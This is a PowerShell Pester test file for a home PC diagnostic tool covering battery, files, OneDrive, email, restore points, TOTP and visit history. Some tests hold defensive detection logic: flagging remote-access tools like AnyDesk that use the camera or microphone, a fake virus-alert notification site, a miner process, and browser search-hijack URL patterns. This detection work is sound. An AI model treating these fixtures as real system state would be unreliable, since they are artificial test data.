    It 'opens Settings for layouts read from the session, which cannot be removed here (Shamil''s PC)' {
        $session = @(
            [pscustomobject]@{ Tag = $null; Tip = $null; Klid = '00000409'; Name = 'US' },
            [pscustomobject]@{ Tag = $null; Tip = $null; Klid = '00000807'; Name = 'Swiss German' })
        $r = Test-HcInputDevices (& $kb @{ Layouts = $session })
        $r.FindingId | Should Be 'manyLayouts'
        (& $fixIds $r) | Should Be 'openKeyboardSettings'
    }

    It 'names Sticky Keys and Filter Keys first, and offers NumLock' {
        (Test-HcInputDevices (& $kb @{ StickyKeys = $true; Layouts = @(& $layout '00000413' 'Dutch') })).FindingId | Should Be 'stickyKeys'
        (Test-HcInputDevices (& $kb @{ FilterKeys = $true; StickyKeys = $true })).FindingId | Should Be 'filterKeys'
        $r = Test-HcInputDevices (& $kb @{ NumLock = $false })
        $r.FindingId | Should Be 'numLockOff'
        (& $fixIds $r) | Should Be @('numLockOn')
        (Test-HcInputDevices (& $kb @{ NumLock = $null })).FindingId | Should Be 'devicesOk'
    }

    It 'explains US-International quote marks when nothing else is wrong' {
        (Test-HcInputDevices (& $kb @{ Layouts = @(& $layout '00020409' 'US-International' 'en-NL' '0409:00020409') })).FindingId | Should Be 'deadKeys'
    }
}

Describe 'C4: laptop battery' {
    $script:Lang = 'en'
    $bat = { param([hashtable]$Change = @{})
        $f = [pscustomobject]@{ HasBattery = $true; Laptop = $true; Charge = 64; RunMinutes = 180; PluggedIn = $false; Charging = $false
                                DesignMWh = 50000; FullMWh = 45000; PowerPlan = 'Balanced' }
        foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
        $f }

    It 'is happy with a healthy battery, and shows the time left on battery' {
        $r = Test-HcBattery (& $bat)
        $r.FindingId | Should Be 'batteryOk'
        @($r.Results | ForEach-Object { $_.Text }) -contains 'Running on the battery (64%), about 180 minutes left' | Should Be $true
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('openBatterySettings')
    }

    It 'tells a desktop from a laptop whose battery is gone (Shamil''s PC is a desktop)' {
        $r = Test-HcBattery (& $bat @{ HasBattery = $false; Laptop = $false })
        $r.FindingId | Should Be 'noBattery'
        @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
        @($r.Actions).Count | Should Be 0
        (Test-HcBattery (& $bat @{ HasBattery = $false; Laptop = $true })).FindingId | Should Be 'batteryMissing'
    }

    It 'grades the wear: worn below 50%, ageing below 70%, unknown when Windows does not say' {
        (Test-HcBattery (& $bat @{ FullMWh = 20000 })).FindingId | Should Be 'batteryWorn'
        (Test-HcBattery (& $bat @{ FullMWh = 20000 })).FindingArgs | Should Be @(40)
        (Test-HcBattery (& $bat @{ FullMWh = 30000 })).FindingId | Should Be 'batteryAging'
        $r = Test-HcBattery (& $bat @{ DesignMWh = $null; FullMWh = $null })
        $r.Results[0].Status | Should Be 'skipped'
        Get-HcBatteryHealth 50000 55000 | Should Be 100
    }

    It 'does not call a battery that stops at 80% on purpose broken, but one stuck at 20% is' {
        $r = Test-HcBattery (& $bat @{ PluggedIn = $true; Charging = $false; Charge = 80 })
        $r.FindingId | Should Be 'chargeLimit'
        ($r.Results | Where-Object { $_.Status -eq 'problem' }) | Should Be $null
        (Test-HcBattery (& $bat @{ PluggedIn = $true; Charging = $false; Charge = 20 })).FindingId | Should Be 'notCharging'
        (Test-HcBattery (& $bat @{ PluggedIn = $true; Charging = $false; Charge = 100 })).FindingId | Should Be 'batteryOk'
        (Test-HcBattery (& $bat @{ PluggedIn = $true; Charging = $true; Charge = 40 })).FindingId | Should Be 'batteryOk'
    }

    It 'puts a battery that does not charge before a worn one' {
        (Test-HcBattery (& $bat @{ PluggedIn = $true; Charging = $false; Charge = 20; FullMWh = 20000 })).FindingId | Should Be 'notCharging'
    }
}

Describe 'G3: a file cannot be found or opens wrong' {
    $script:Lang = 'en'
    $now = [datetime]'2026-09-27 15:00'
    $find = { param([hashtable]$Change = @{})
        $f = [pscustomobject]@{
            Now = $now; Downloads = 'C:\Users\x\Downloads'; Count = 20; NewestAt = $now.AddMinutes(-12); NewestType = '.pdf'
            Browsers = @([pscustomobject]@{ Name = 'Microsoft Edge'; Folder = $null; Ask = $false })
            Types = @(
                [pscustomobject]@{ Extension = '.pdf'; Name = 'Microsoft Edge' }
                [pscustomobject]@{ Extension = '.jpg'; Name = 'Photos' }
                [pscustomobject]@{ Extension = '.docx'; Name = 'Microsoft Word' }
                [pscustomobject]@{ Extension = '.mp4'; Name = 'Media Player' })
            SearchOn = $true; SearchOff = $false
        }
        foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
        $f }
    $fixIds = { param($r) @($r.Actions | ForEach-Object { $_.FixId }) }

    It 'is happy when search works and everything has a program, and never shows a file name' {
        $r = Test-HcFind (& $find)
        $r.FindingId | Should Be 'findOk'
        @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
        ($r.Results | Where-Object { $_.Text -like 'Downloads:*' }).Text | Should Be 'Downloads: 20 files, the newest 12 minutes ago (.pdf)'
        (& $fixIds $r) | Should Be @('openFolder', 'openDefaultApps')
        $r.Actions[0].Target.Path | Should Be 'C:\Users\x\Downloads'
    }

    It 'names a type that has no program (Word files on Shamil''s PC)' {
        $types = @([pscustomobject]@{ Extension = '.pdf'; Name = 'Microsoft Edge' }, [pscustomobject]@{ Extension = '.docx'; Name = $null })
        $r = Test-HcFind (& $find @{ Types = $types })
        $r.FindingId | Should Be 'noProgram'
        $r.FindingArgs | Should Be @('Word files (.docx)')
    }

    It 'puts switched-off search first, with a fix' {
        $r = Test-HcFind (& $find @{ SearchOn = $false; Types = @([pscustomobject]@{ Extension = '.docx'; Name = $null }) })
        $r.FindingId | Should Be 'searchOff'
        (& $fixIds $r)[0] | Should Be 'startSearch'
    }

    It 'finds a browser that saves elsewhere, opens that folder, and notices one that asks every time' {
        $edge = [pscustomobject]@{ Name = 'Microsoft Edge'; Folder = 'D:\Spul'; Ask = $false }
        $r = Test-HcFind (& $find @{ Browsers = @($edge) })
        $r.FindingId | Should Be 'downloadsElsewhere'
        $r.FindingArgs | Should Be @('Microsoft Edge', 'D:\Spul')
        @($r.Actions | Where-Object { $_.FixId -eq 'openFolder' } | ForEach-Object { $_.Target.Path }) | Should Be @('C:\Users\x\Downloads', 'D:\Spul')
        $same = [pscustomobject]@{ Name = 'Google Chrome'; Folder = 'C:\Users\x\Downloads\'; Ask = $true }
        (Test-HcFind (& $find @{ Browsers = @($same) })).FindingId | Should Be 'browserAsks'
    }

    It 'tells the age as minutes, hours or a date' {
        Format-HcAge $now.AddMinutes(-5) $now | Should Be '5 minutes ago'
        Format-HcAge $now.AddHours(-3) $now | Should Be '3 hours ago'
        Format-HcAge ([datetime]'2026-09-18 21:59') $now | Should Be (Format-HcDate ([datetime]'2026-09-18'))
    }
}

Describe 'G2: files gone or not everywhere' {
    $script:Lang = 'en'
    $folder = { param($key, $oneDrive = $true, $exists = $true, $items = 5)
        [pscustomobject]@{ Key = $key; Path = "C:\Users\x\$(if ($oneDrive) { 'OneDrive\' })$key"; Exists = $exists; InOneDrive = $oneDrive; Items = $items } }
    $files = { param([hashtable]$Change = @{})
        $f = [pscustomobject]@{
            TempProfile = $false
            Folders = @((& $folder 'desktop'), (& $folder 'documents'), (& $folder 'pictures'))
            OneDriveExe = 'C:\Users\x\AppData\Local\Microsoft\OneDrive\OneDrive.exe'; OneDriveRunning = $true; SignedIn = $true
            Disk = [pscustomobject]@{ FreeGB = 120 }; RecycleBin = 0
        }
        foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
        $f }
    $fixIds = { param($r) @($r.Actions | ForEach-Object { $_.FixId }) }

    It 'is happy when the folders are there and OneDrive runs signed in' {
        $r = Test-HcFiles (& $files)
        $r.FindingId | Should Be 'filesOk'
        @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
        $r.Results[0].Text | Should Be 'Desktop: in the OneDrive folder, 5 items'
    }

    It 'says OneDrive was removed while the folders still live in its folder (Shamil''s PC)' {
        $r = Test-HcFiles (& $files @{ OneDriveExe = $null; OneDriveRunning = $false; SignedIn = $false; RecycleBin = 1 })
        $r.FindingId | Should Be 'oneDriveRemoved'
        @($r.Results | Where-Object { $_.Status -eq 'problem' }).Count | Should Be 1
        (& $fixIds $r) | Should Be @('openRecycleBin')                # nothing to start: the program is gone
    }

    It 'calls local folders without OneDrive fine, only without a copy elsewhere' {
        $local = @((& $folder 'desktop' $false), (& $folder 'documents' $false), (& $folder 'pictures' $false))
        $r = Test-HcFiles (& $files @{ Folders = $local; OneDriveExe = $null; OneDriveRunning = $false; SignedIn = $false })
        $r.FindingId | Should Be 'filesLocal'
        @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
    }

    It 'starts OneDrive when it is signed out or not running' {
        $r = Test-HcFiles (& $files @{ SignedIn = $false; OneDriveRunning = $false })
        $r.FindingId | Should Be 'oneDriveSignedOut'
        $r.Actions[0].FixId | Should Be 'startOneDrive'
        $r.Actions[0].Target.Exe | Should Match 'OneDrive\.exe$'
        $r = Test-HcFiles (& $files @{ OneDriveRunning = $false })
        $r.FindingId | Should Be 'oneDriveNotRunning'
        (& $fixIds $r) | Should Be @('startOneDrive')
    }

    It 'names a folder that points nowhere, and puts a temporary profile first' {
        $gone = @((& $folder 'desktop'), (& $folder 'documents' $true $false), (& $folder 'pictures'))
        $r = Test-HcFiles (& $files @{ Folders = $gone })
        $r.FindingId | Should Be 'folderMissing'
        $r.FindingArgs | Should Be @('Documents')
        (Test-HcFiles (& $files @{ Folders = $gone; TempProfile = $true })).FindingId | Should Be 'tempProfile'
    }

    It 'warns that a full disk stops syncing, and points to the Recycle Bin when all else is fine' {
        $r = Test-HcFiles (& $files @{ Disk = [pscustomobject]@{ FreeGB = 0.8 } })
        $r.FindingId | Should Be 'syncDiskFull'
        $r = Test-HcFiles (& $files @{ RecycleBin = 23 })
        $r.FindingId | Should Be 'recycleHasItems'
        $r.FindingArgs | Should Be @(23)
        (& $fixIds $r) | Should Be @('openRecycleBin')
    }
}

Describe 'A4: email' {
    $script:Lang = 'en'
    It 'reads the domain from an address, or takes the domain itself' {
        ConvertTo-HcMailDomain ' Jan.Jansen@Ziggo.NL ' | Should Be 'ziggo.nl'
        ConvertTo-HcMailDomain 'kpnmail.nl' | Should Be 'kpnmail.nl'
        ConvertTo-HcMailDomain 'geen adres' | Should Be $null
    }
    It 'spots a typo of a known provider, but not the provider itself or a stranger' {
        Get-HcMailTypo 'zigo.nl' | Should Be 'ziggo.nl'
        Get-HcMailTypo 'hotmial.com' | Should Be 'hotmail.com'
        Get-HcMailTypo 'gmial.com' | Should Be 'gmail.com'
        Get-HcMailTypo 'ziggo.nl' | Should Be $null
        Get-HcMailTypo 'bakkerij-devries.nl' | Should Be $null
    }

    $mail = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ Domain = 'ziggo.nl'; Provider = 'Ziggo'; Web = $null; Typo = $null; ReceivesMail = $true
            ImapHost = 'imap.ziggo.nl'; ImapMs = 30; SmtpHost = 'smtp.ziggo.nl'; SmtpMs = 20
            Apps = [pscustomobject]@{ Apps = @('Outlook'); RetiredMail = $false } }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    It 'finds typos, dead domains, unreachable servers and the retired Mail app' {
        $ok = Test-HcMail (& $mail)
        $ok.FindingId | Should Be 'mailOk'
        $ok.FindingArgs | Should Be @('Ziggo')
        (Test-HcMail (& $mail @{ Domain = 'zigo.nl'; Provider = $null; Typo = 'ziggo.nl' })).FindingId | Should Be 'mailTypo'
        (Test-HcMail (& $mail @{ Domain = 'hetnt.nl'; Provider = $null; ReceivesMail = $false })).FindingId | Should Be 'mailNoDomain'
        (Test-HcMail (& $mail @{ SmtpMs = -1 })).FindingId | Should Be 'mailServerDown'
        (Test-HcMail (& $mail @{ Apps = [pscustomobject]@{ Apps = @(); RetiredMail = $true } })).FindingId | Should Be 'mailAppRetired'
    }
    It 'offers webmail only where the address is known' {
        @((Test-HcMail (& $mail @{ Web = 'https://mail.google.com/'; Provider = 'Gmail' })).Actions)[0].FixId | Should Be 'openWebmail'
        @((Test-HcMail (& $mail)).Actions).Count | Should Be 0
    }
    It 'runs from the menu, asking for the address' {
        Mock Get-HcNetworkFacts { New-FakeFacts }
        Mock Get-HcMailFacts { & $mail }
        { Start-Housecall -Lang nl -Answers @('A4', 'jan@ziggo.nl', '', 'Q') } | Should Not Throw
        Assert-MockCalled Get-HcMailFacts -Times 1 -Exactly -Scope It -ParameterFilter { $Domain -eq 'ziggo.nl' }
    }
}

Describe 'More fixes, the restore point and -NoAI' {
    $script:Lang = 'en'
    It 'offers an adapter restart and a network reset where they help' {
        $noAddr = Test-HcInternet (New-FakeFacts @{ IPv4 = '169.254.1.1'; InternetMs = $null })
        @($noAddr.Actions | ForEach-Object { $_.FixId }) | Should Be @('renewIp', 'restartAdapter')
        $noAddr.Actions[1].Target.Name | Should Be 'Wi-Fi'
        @((Test-HcInternet (New-FakeFacts @{ DnsOk = $false; Web = $null })).Actions | ForEach-Object { $_.FixId }) | Should Be @('flushDns', 'resetWinsock')
    }
    It 'offers to uninstall a remote tool through its own uninstaller, and the browser''s notification page' {
        $tool = New-FakeTool -InstallDate ([datetime]'2026-09-24')
        $tool | Add-Member Processes @('AnyDesk')
        $tool | Add-Member Uninstall '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --uninstall'
        $sites = @([pscustomobject]@{ Browser = 'Chrome'; Site = 'https://virus-alert.example'; Since = $null })
        $r = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @($tool); Notifications = $sites }) @('remote', 'notifications') 'cleanAll'
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('uninstallProgram', 'openNotifySettings')
        $r.Actions[0].Target.Command | Should Match '--uninstall'
        $r.Actions[1].Target.Browser | Should Be 'Chrome'
    }
    It 'runs an uninstall command with quotes and arguments correctly' {
        Mock Start-Process { }
        & $script:Fixes.uninstallProgram.Apply @{ Command = '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --uninstall' }
        Assert-MockCalled Start-Process -Times 1 -Exactly -Scope It -ParameterFilter { $FilePath -eq 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe' -and $ArgumentList -eq '--uninstall' }
        & $script:Fixes.uninstallProgram.Apply @{ Command = 'MsiExec.exe /X{1234-ABCD}' }
        Assert-MockCalled Start-Process -Times 1 -Exactly -Scope It -ParameterFilter { $FilePath -eq 'MsiExec.exe' -and $ArgumentList -eq '/X{1234-ABCD}' }
    }
    It 'makes a restore point once, before the first admin fix only' {
        Mock Checkpoint-Computer { }
        $script:IsAdmin = $true; $script:RestorePointDone = $false
        New-HcRestorePoint; New-HcRestorePoint
        Assert-MockCalled Checkpoint-Computer -Times 1 -Exactly -Scope It
        $script:IsAdmin = $false; $script:RestorePointDone = $false
        New-HcRestorePoint
        Assert-MockCalled Checkpoint-Computer -Times 1 -Exactly -Scope It
    }
    It 'carries on when Windows cannot make a restore point' {
        Mock Checkpoint-Computer { throw 'System restore is disabled' }
        $script:IsAdmin = $true; $script:RestorePointDone = $false
        { New-HcRestorePoint } | Should Not Throw
        $script:IsAdmin = $false
    }
    It '-NoAI hides the chat and treats ? and sentences as unknown' {
        Mock Get-HcEnvironment { [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $true } }
        Mock Invoke-HcAi { }
        $out = Start-Housecall -Lang en -NoAI -Answers @('?', 'my printer is broken', 'Q') 6>&1 | Out-String
        Assert-MockCalled Invoke-HcAi -Times 0 -Exactly -Scope It
        $out | Should Not Match 'AI chat'
    }
}

Describe 'Setup: Google Authenticator codes' {
    . (Join-Path $root 'tools\setup-ai.ps1') -FunctionsOnly
    It 'matches the RFC 6238 test values (SHA-1)' {
        $key = [Text.Encoding]::ASCII.GetBytes('12345678901234567890')
        Get-Totp $key 1 | Should Be '287082'            # T = 59
        Get-Totp $key 37037036 | Should Be '081804'     # T = 1111111109
        Get-Totp $key 41152263 | Should Be '005924'     # T = 1234567890 (RFC: 89005924)
    }
    It 'turns a secret into Base32 and back' {
        $bytes = [byte[]](1..20)
        $text = ConvertTo-Base32 $bytes
        $text | Should Match '^[A-Z2-7]{32}$'
        (ConvertFrom-Base32 $text) -join ',' | Should Be ($bytes -join ',')
        ConvertTo-Base32 ([Text.Encoding]::ASCII.GetBytes('foobar')) | Should Be 'MZXW6YTBOI'
    }
}

Describe 'Relay: unlock and visit memory' {
    Mock Get-HcEnvironment { [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $true } }

    It 'makes a stable 64-character id for this PC' {
        $a = Get-HcPcId
        $a | Should Match '^[0-9a-f]{64}$'
        Get-HcPcId | Should Be $a
    }

    It 'unlocks with a code, retries a wrong one, and skips on Enter' {
        $script:HcToken = $null
        $script:Calls = @()
        Mock Invoke-HcRelay {
            $script:Calls += $Body.action
            if ($Body.action -eq 'unlock' -and $Body.code -eq '111111') { return [pscustomobject]@{ Ok = $false; Status = 401; Data = $null; Error = 'wrong_code' } }
            if ($Body.action -eq 'unlock') { return [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }; Error = $null } }
            [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ visits = @() }; Error = $null }
        }
        $script:HcInputQueue = New-Object System.Collections.Queue
        foreach ($a in @('111111', '222 222')) { $script:HcInputQueue.Enqueue($a) }
        Unlock-HcRelay | Should Be $true
        $script:HcToken | Should Be 't.s'
        Unlock-HcRelay | Should Be $true                    # already unlocked: no new code asked
        @($script:Calls | Where-Object { $_ -eq 'unlock' }).Count | Should Be 2

        $script:HcToken = $null
        $script:HcInputQueue = New-Object System.Collections.Queue
        $script:HcInputQueue.Enqueue('')
        Unlock-HcRelay | Should Be $false
        $script:HcInputQueue = $null
    }

    It 'shows "no earlier visits" for a PC without history, and the real error when the relay fails' {
        $script:HcToken = 't.s'; $script:HcTokenExpires = (Get-Date).AddHours(1)
        Mock Invoke-HcRelay { [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ visits = @() }; Error = $null } }
        $empty = Get-HcVisits
        $empty.Ok | Should Be $true
        @($empty.Visits).Count | Should Be 0
        $out = Show-HcHistory ([pscustomobject]@{ Online = $true; Os = 'x'; IsAdmin = $false; PSVersion = [version]'5.1' }) 6>&1 | Out-String
        $out | Should Match 'No earlier visits'
        $out | Should Not Match 'cannot be reached'

        Mock Invoke-HcRelay { [pscustomobject]@{ Ok = $false; Status = 500; Data = $null; Error = 'database' } }
        $failed = Get-HcVisits
        $failed.Ok | Should Be $false
        $failed.Error | Should Be 'database'
        $out = Show-HcHistory ([pscustomobject]@{ Online = $true; Os = 'x'; IsAdmin = $false; PSVersion = [version]'5.1' }) 6>&1 | Out-String
        $out | Should Match 'error \(database\)'
    }

    It 'saves the visit at the end, with the codes found and the fixes made, but not in a dry run' {
        $script:Saved = $null
        Mock Invoke-HcRelay {
            if ($Body.action -eq 'unlock') { return [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }; Error = $null } }
            if ($Body.action -eq 'visit_save') { $script:Saved = $Body }
            [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ visits = @() }; Error = $null }
        }
        Mock Get-HcNetworkFacts { New-FakeFacts }
        Start-Housecall -Lang nl -Answers @('A1', '', 'Q', '123456', 'mevr. de Vries')
        $script:Saved.pc | Should Match '^[0-9a-f]{64}$'
        $script:Saved.label | Should Be 'mevr. de Vries'
        @($script:Saved.problems)[0].code | Should Be 'A1'
        @($script:Saved.problems)[0].finding | Should Be 'allGood'
        $script:Saved.lang | Should Be 'nl'

        $script:Saved = $null
        Start-Housecall -Lang nl -DryRun -Answers @('A1', '', 'Q')
        $script:Saved | Should Be $null
    }
}

Describe 'The window (phase 6)' {
    $script:Lang = 'en'
    $report = { param([string[]]$Statuses)
        $r = New-HcReport
        foreach ($s in $Statuses) { Add-HcLine $r $s 'x' }
        $r }

    It 'colours a report by its worst line' {
        Get-HcReportLevel (& $report @('ok', 'warn', 'problem')) | Should Be 'problem'
        Get-HcReportLevel (& $report @('ok', 'warn', 'skipped')) | Should Be 'warn'
        Get-HcReportLevel (& $report @('ok', 'skipped')) | Should Be 'ok'
        Get-HcReportLevel (& $report @()) | Should Be 'ok'
    }

    It 'shows who used the camera or microphone, and flags remote tools (F4)' {
        $script:Lang = 'en'
        $now = [datetime]'2026-10-06 20:00'
        $use = { param($app, $kind, $days, $inUse = $false, $path = $null) [pscustomobject]@{ Kind = $kind; App = $app; Path = $path; Last = $now.AddDays(-$days); InUse = $inUse } }
        Get-HcConsentAppName '5319275A.WhatsAppDesktop_cv1g1gvanyjgm' '' | Should Be 'WhatsAppDesktop'
        Get-HcConsentAppName 'C:#Program Files#Zoom#bin#Zoom.exe' '' | Should Be 'Zoom'
        Get-HcConsentAppName 'C:#Games#GTA5.exe' 'Grand Theft Auto V' | Should Be 'Grand Theft Auto V'
        $r = Test-HcCamMic ([pscustomobject]@{ Now = $now; Uses = @((& $use 'WhatsAppDesktop' 'microphone' 2), (& $use 'Zoom' 'webcam' 40)) })
        $r.FindingId | Should Be 'camMicOk'
        (@($r.Results | ForEach-Object { $_.Text }) -join ' ') | Should Match '1 more app'
        (Test-HcCamMic ([pscustomobject]@{ Now = $now; Uses = @((& $use 'Teams' 'webcam' 0 $true)) })).FindingId | Should Be 'camMicInUse'
        $r = Test-HcCamMic ([pscustomobject]@{ Now = $now; Uses = @((& $use 'AnyDesk' 'microphone' 1 $false 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe')) })
        $r.FindingId | Should Be 'camMicSuspicious'
        (Test-HcCamMic ([pscustomobject]@{ Now = $now; Uses = @((& $use 'helper' 'webcam' 1 $false 'C:\Users\x\Downloads\helper.exe')) })).FindingId | Should Be 'camMicSuspicious'
        (Test-HcCamMic ([pscustomobject]@{ Now = $now; Uses = @() })).FindingId | Should Be 'camMicNone'
    }

    It 'finds whether photos are backed up, links open right, and both screens are used (G4, G5, B6)' {
        $script:Lang = 'en'
        $pho = { param([hashtable]$c = @{}) $f = [pscustomobject]@{ Pictures = 'C:\Users\x\Pictures'; InOneDrive = $false; Photos = 1200; OneDriveExe = 'C:\x\OneDrive.exe'; OneDriveRunning = $true; SignedIn = $true; FileHistory = $false; Other = @() }; foreach ($k in $c.Keys) { $f.$k = $c[$k] }; $f }
        $r = Test-HcPhotoBackup (& $pho)
        $r.FindingId | Should Be 'photosNoBackup'
        $r.FindingArgs[0] | Should Be '1200'
        (Test-HcPhotoBackup (& $pho @{ InOneDrive = $true })).FindingId | Should Be 'photosBackedUp'
        (Test-HcPhotoBackup (& $pho @{ InOneDrive = $true; OneDriveExe = $null })).FindingId | Should Be 'photosOneDriveBroken'
        (Test-HcPhotoBackup (& $pho @{ FileHistory = $true })).FindingId | Should Be 'photosBackedUp'
        (Test-HcPhotoBackup (& $pho @{ Other = @('Google Drive') })).FindingId | Should Be 'photosBackedUp'
        (Test-HcPhotoBackup (& $pho @{ Photos = 0 })).FindingId | Should Be 'photosNone'
        $lnk = { param($web, $wn, $mail, $mn) [pscustomobject]@{ WebProgId = $web; WebName = $wn; MailProgId = $mail; MailName = $mn } }
        (Test-HcLinks (& $lnk 'ChromeHTML' 'Google Chrome' 'Outlook.URL.mailto.15' 'Outlook')).FindingId | Should Be 'linksOk'
        $r = Test-HcLinks (& $lnk 'MSEdgeHTM' 'Microsoft Edge' 'AppXydk58wgm44se4b399k9z1j0o9e3ajnru' 'Mail')
        $r.FindingId | Should Be 'mailLinksRetired'
        (Test-HcLinks (& $lnk 'IE.HTTPS' 'Internet Explorer' $null $null)).FindingId | Should Be 'linksOldBrowser'
        (Test-HcLinks (& $lnk 'BraveHTML' 'Brave' $null $null)).FindingId | Should Be 'mailLinksNone'
        (Test-HcScreens ([pscustomobject]@{ Monitors = @('HP 24f'); Desktops = 1 })).FindingId | Should Be 'screenNotSeen'
        $r = Test-HcScreens ([pscustomobject]@{ Monitors = @('HP 24f', 'Philips TV'); Desktops = 1 })
        $r.FindingId | Should Be 'screensOneDesktop'
        @($r.Actions | ForEach-Object { $_.FixId }) -join ',' | Should Be 'displayExtend,displayClone'
        (Test-HcScreens ([pscustomobject]@{ Monitors = @('A', 'B'); Desktops = 2 })).FindingId | Should Be 'screensExtended'
        foreach ($lang in 'en', 'nl') {
            foreach ($id in 'camMicOk', 'camMicNone', 'photosNone', 'photosOneDriveBroken', 'photosNoBackup', 'photosBackedUp', 'screenNotSeen', 'screensOneDesktop', 'screensExtended') {
                foreach ($kind in 'finding', 'advice', 'steps') { "$lang $kind.$id $([bool]$script:Strings[$lang]["$kind.$id"])" | Should Be "$lang $kind.$id True" }
            }
        }
    }

    It 'finds restarts, heat, install blocks and a hijacked browser (D5, D6, E6, F5)' {
        $script:Lang = 'en'
        $rst = { param([hashtable]$c = @{}) $f = [pscustomobject]@{ Off = 0; LastOff = $null; BlueScreens = 0; UpdateRestarts = 0; OtherRestarts = 3; ActiveStart = 8; ActiveEnd = 17 }; foreach ($k in $c.Keys) { $f.$k = $c[$k] }; $f }
        (Test-HcRestarts (& $rst)).FindingId | Should Be 'restartsOk'
        (Test-HcRestarts (& $rst @{ Off = 2; LastOff = [datetime]'2026-10-01 14:00' })).FindingId | Should Be 'unexpectedOff'
        (Test-HcRestarts (& $rst @{ BlueScreens = 1 })).FindingId | Should Be 'blueScreenRestarts'
        $r = Test-HcRestarts (& $rst @{ UpdateRestarts = 2 })
        $r.FindingId | Should Be 'updateRestarts'
        @($r.Actions | ForEach-Object { $_.FixId }) -join ',' | Should Be 'openActiveHours'
        $heat = { param([hashtable]$c = @{}) $f = [pscustomobject]@{ Laptop = $true; Cpu = 10; Busy = @(); Plan = 'Balanced'; PerformancePlan = $false }; foreach ($k in $c.Keys) { $f.$k = $c[$k] }; $f }
        (Test-HcHeat (& $heat)).FindingId | Should Be 'hotDust'
        $r = Test-HcHeat (& $heat @{ Cpu = 90; Busy = @([pscustomobject]@{ Name = 'miner'; Cpu = 80; MemoryMB = 10 }) })
        $r.FindingId | Should Be 'hotBusy'
        $r.FindingArgs[1] | Should Be 'miner'
        (Test-HcHeat (& $heat @{ Plan = 'High performance'; PerformancePlan = $true })).FindingId | Should Be 'hotPlan'
        (Test-HcHeat (& $heat @{ Laptop = $false; Plan = 'High performance'; PerformancePlan = $true })).FindingId | Should Be 'hotDust'
        $ins = { param([hashtable]$c = @{}) $f = [pscustomobject]@{ SMode = $false; SmartApp = 0; AppSource = 'Anywhere'; FreeGB = 80; InstallerOff = $false; AdminAccount = $true; RebootPending = $false }; foreach ($k in $c.Keys) { $f.$k = $c[$k] }; $f }
        (Test-HcInstall (& $ins)).FindingId | Should Be 'installOk'
        (Test-HcInstall (& $ins @{ SMode = $true })).FindingId | Should Be 'installSMode'
        (Test-HcInstall (& $ins @{ AppSource = 'StoreOnly' })).FindingId | Should Be 'installStoreOnly'
        (Test-HcInstall (& $ins @{ AppSource = 'PreferStore' })).FindingId | Should Be 'installOk'
        (Test-HcInstall (& $ins @{ FreeGB = 2 })).FindingId | Should Be 'installNoSpace'
        (Test-HcInstall (& $ins @{ InstallerOff = $true })).FindingId | Should Be 'installMsiOff'
        (Test-HcInstall (& $ins @{ AdminAccount = $false })).FindingId | Should Be 'installNotAdmin'
        (Test-HcInstall (& $ins @{ SmartApp = 1 })).FindingId | Should Be 'installSmartApp'
        Get-HcUrlHost '{google:baseURL}search?q={searchTerms}' | Should Be 'google.com'
        Get-HcUrlHost '{bing:baseURL}search?q={searchTerms}' | Should Be 'bing.com'
        Get-HcUrlHost 'https://www.Ecosia.org/search?q=x' | Should Be 'ecosia.org'
        Test-HcHijackUrl 'https://www.google.nl/search?q=x' | Should Be $false
        Test-HcHijackUrl 'https://search.yahoo.com/yhs/search?hspart=x&p=y' | Should Be $true
        Test-HcHijackUrl 'https://search.mysearch-tool.com/?q=x' | Should Be $true
        $br = { param($search, $start = @(), $exts = @()) [pscustomobject]@{ Browser = 'Chrome'; Profile = 'Default'; Search = $search; Start = $start; Extensions = $exts } }
        (Test-HcHijack ([pscustomobject]@{ Browsers = @((& $br '{google:baseURL}')); Policies = @() })).FindingId | Should Be 'browserOk'
        $r = Test-HcHijack ([pscustomobject]@{ Browsers = @((& $br 'https://search.mysearch-tool.com/?q={searchTerms}')); Policies = @() })
        $r.FindingId | Should Be 'browserSearchHijack'
        @($r.Actions | ForEach-Object { $_.FixId }) -join ',' | Should Be 'openBrowserReset'
        (Test-HcHijack ([pscustomobject]@{ Browsers = @((& $br $null @('https://search.mysearch-tool.com/'))); Policies = @() })).FindingId | Should Be 'browserStartHijack'
        (Test-HcHijack ([pscustomobject]@{ Browsers = @((& $br $null @() @([pscustomobject]@{ Id = 'x'; Name = 'Coupons'; FromStore = $false }))); Policies = @() })).FindingId | Should Be 'browserExtOutside'
        (Test-HcHijack ([pscustomobject]@{ Browsers = @(); Policies = @([pscustomobject]@{ Browser = 'Edge'; Names = @('HubsSidebarEnabled', 'DefaultSearchProviderSearchURL') }) })).FindingId | Should Be 'browserPolicy'
        # A privacy tool's rules (Copilot off, no shopping) are no hijack: found on Shamil's PC.
